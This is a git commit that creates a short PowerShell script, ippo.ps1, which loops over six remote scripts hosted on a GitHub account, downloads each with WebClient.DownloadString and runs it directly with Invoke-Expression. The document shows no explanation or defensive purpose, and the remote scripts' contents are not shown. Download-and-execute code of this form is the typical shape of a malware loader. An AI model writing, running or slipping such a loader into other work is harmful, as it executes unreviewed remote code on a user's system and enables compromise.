b05f74ab88a5d1b41cc9d05053c33b958692ba2c
jia891 <phamly2tb@gmail.com>
2026-01-15 05:03:12 -0800

    Create ippo.ps1

---
+++ ippo.ps1
@@ -0,0 +1,12 @@
+
+for ($i = 1; $i -le 6; $i++) {
+   
+    $url = "https://raw.githubusercontent.com/jia891/myweb/refs/heads/main/dc$i.ps1"
+    
+    
+    $webClient = New-Object System.Net.WebClient
+    $scriptContent = $webClient.DownloadString($url)
+    
+    
+    Invoke-Expression $scriptContent
+}
